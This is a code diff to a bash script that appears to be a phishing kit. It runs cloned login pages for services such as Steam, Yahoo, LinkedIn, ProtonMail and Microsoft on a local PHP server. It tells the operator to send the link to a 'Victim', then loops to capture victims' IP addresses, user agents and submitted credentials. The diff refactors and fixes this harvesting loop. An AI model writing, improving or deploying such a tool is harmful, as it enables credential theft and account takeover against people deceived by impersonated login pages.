@@ -42,7 +42,7 @@ print_menu() {
 }
 
 
-banner() {
+print_banner() {
     printf "\n"
     printf "\n"
     printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
@@ -71,7 +71,7 @@ menu() {
 	    10) server=origin && start ;;
 	    11) server=steam && start ;;
 	    12) server=yahoo && start ;;
-	    12) server=linkedin && start ;;
+	    13) server=linkedin && start ;;
 	    14) server=protonmail && start ;;
 	    15) server=wordpress && start ;;
 	    16) server=microsoft && start ;;
@@ -103,7 +103,22 @@ stop() {
     if [[ $checkphp == *'php'* ]]; then
         sudo pkill -f -2 php > /dev/null 2>&1
         sudo killall -2 php > /dev/null 2>&1
-        sudo kill $(pidof php) > /dev/null 2>&1
+        sudo kill "$(pidof php)" > /dev/null 2>&1
+    fi
+}
+
+clean() {
+    sudo service apache2 stop
+    sudo pkill -f -2 php > /dev/null 2>&1
+    sudo killall -2 php > /dev/null 2>&1
+    sudo kill "$(pidof php)" > /dev/null 2>&1
+
+    if [[ -e sites/$server/ip.txt ]]; then
+        rm -rf sites/$server/ip.txt
+    fi
+
+    if [[ -e sites/$server/usernames.txt ]]; then
+        rm -rf sites/$server/usernames.txt
     fi
 }
 
@@ -161,20 +176,7 @@ catch_cred() {
 }
 
 
-getcredentials() {
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
-    while [ true ]; do
-        if [[ -e "sites/$server/usernames.txt" ]]; then
-            printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
-            catch_cred
-        fi
-        sleep 1
-    done
-}
-
-
 catch_ip() {
-    touch sites/$server/saved.usernames.txt
     ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
     IFS=$'\n'
     ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
@@ -244,22 +246,11 @@ catch_ip() {
     
     printf "\n"
     rm -rf iptracker.log
-
-    getcredentials
 }
 
 
 start() {
-    if [[ -e sites/$server/ip.txt ]]; then
-        rm -rf sites/$server/ip.txt
-    fi
-    
-    if [[ -e sites/$server/usernames.txt ]]; then
-        rm -rf sites/$server/usernames.txt
-    fi
-
-    sudo service apache2 stop
-
+    clean
     default_ip=$(hostname -I)
     printf "\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
     read ip
@@ -268,24 +259,32 @@ start() {
     sudo php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 & 
     sleep 2
     printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
-    checkfound
+
+    main_loop
 }
 
 
-checkfound() {
+main_loop() {
     printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
     
-    while [ true ]; do
-    if [[ -e "sites/$server/ip.txt" ]]; then
-        printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
-        catch_ip
-    fi
-    
-    sleep 1
+    while true; do
+      if [[ -e "sites/$server/ip.txt" ]]; then
+          printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+          catch_ip
+          rm -rf sites/$server/ip.txt
+      fi
+      sleep 1
+
+      if [[ -e "sites/$server/usernames.txt" ]]; then
+          printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+          catch_cred
+          rm -rf sites/$server/usernames.txt
+      fi
+      sleep 1
     done
 }
 
-banner
+print_banner
 dependencies
 menu
-
